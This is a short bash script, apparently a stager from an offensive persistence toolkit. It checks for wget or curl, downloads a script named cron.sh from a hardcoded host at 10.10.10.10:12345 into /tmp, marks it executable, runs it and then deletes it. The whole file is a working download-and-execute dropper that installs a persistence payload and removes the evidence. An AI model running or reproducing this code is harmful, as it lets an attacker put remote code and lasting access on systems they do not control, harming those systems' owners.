#!/bin/bash

FALSE=$(/bin/false)
HAS_WGET=$(which wget)
HAS_CURL=$(which curl)
IP="10.10.10.10"
PORT="12345"
URL="http://$IP:$PORT/persistence/cron/cron.sh"
FILENAME="cron.sh"

cd /tmp

if [[ "$HAS_WGET" != "$FALSE" ]];
then
	wget "$URL" -O "$FILENAME"
	chmod +x "$FILENAME"
	./$FILENAME
	rm "$FILENAME"
	exit
fi

if [[ "$HAS_CURL" != "$FALSE" ]];
then
	curl "$URL" -o "$FILENAME"
	chmod +x "$FILENAME"
	./$FILENAME
	rm "$FILENAME"
	exit
fi
